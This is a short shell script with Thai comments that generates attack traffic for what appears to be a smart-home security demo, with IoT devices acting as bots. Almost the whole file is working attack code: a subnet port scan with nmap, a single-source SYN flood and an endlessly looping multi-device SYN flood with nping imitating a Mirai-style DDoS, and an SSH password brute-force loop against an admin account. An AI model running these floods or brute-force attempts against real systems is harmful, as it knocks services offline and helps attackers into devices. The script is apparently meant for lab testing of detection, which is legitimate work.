#!/bin/sh
# ตัวสร้างการโจมตีสำหรับเดโม smart-home (Alpine: apk add nmap -- มี nmap + nping)
#
# ใช้บน atk1 (อุปกรณ์โดนยึด) หรือบนอุปกรณ์ IoT ที่สวมบท bot
#   ./attack.sh scan                 # สแกนหาอุปกรณ์ทั้งบ้าน (fan-out)
#   ./attack.sh dos      <victim>    # SYN flood ต้นทางเดียว
#   ./attack.sh brute    <victim>    # SSH brute-force
#   ./attack.sh ddos-bot <victim>    # โหมด bot: ยิงร่วมกันหลายเครื่อง = DDoS/fan-in (Mirai)
#
# เดโม DDoS: รัน `attack.sh ddos-bot 203.0.113.10` พร้อมกันบน atk1 + กล้อง + ปลั๊ก + หลอดไฟ

LAN="${LAN_SUBNET:-192.168.10.0/24}"
VICTIM="${2:-203.0.113.10}"
case "$1" in
  scan)
    echo "[atk] port/host scan ทั่วบ้าน $LAN"
    nmap -sT -T4 --max-retries 1 -p 1-1024 "$LAN" >/dev/null 2>&1 ;;
  dos)
    echo "[atk] SYN flood -> $VICTIM:80 (ต้นทางเดียว)"
    nping --tcp -p 80 --flags syn --rate 500 -c 2000 "$VICTIM" >/dev/null 2>&1 ;;
  brute)
    echo "[atk] SSH brute-force -> $VICTIM"
    i=0; while [ $i -lt 40 ]; do
      ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
          -o ConnectTimeout=2 -o BatchMode=yes -o PreferredAuthentications=password \
          -o PubkeyAuthentication=no admin@"$VICTIM" true >/dev/null 2>&1
      i=$((i+1)); done ;;
  ddos-bot)
    echo "[atk] BOT flood -> $VICTIM:80 (รันพร้อมกันหลายเครื่อง = fan-in)"
    while :; do nping --tcp -p 80 --flags syn --rate 300 -c 600 "$VICTIM" >/dev/null 2>&1; sleep 1; done ;;
  *) echo "usage: $0 {scan|dos|brute|ddos-bot} [victim]"; exit 1 ;;
esac
echo "[atk] done"
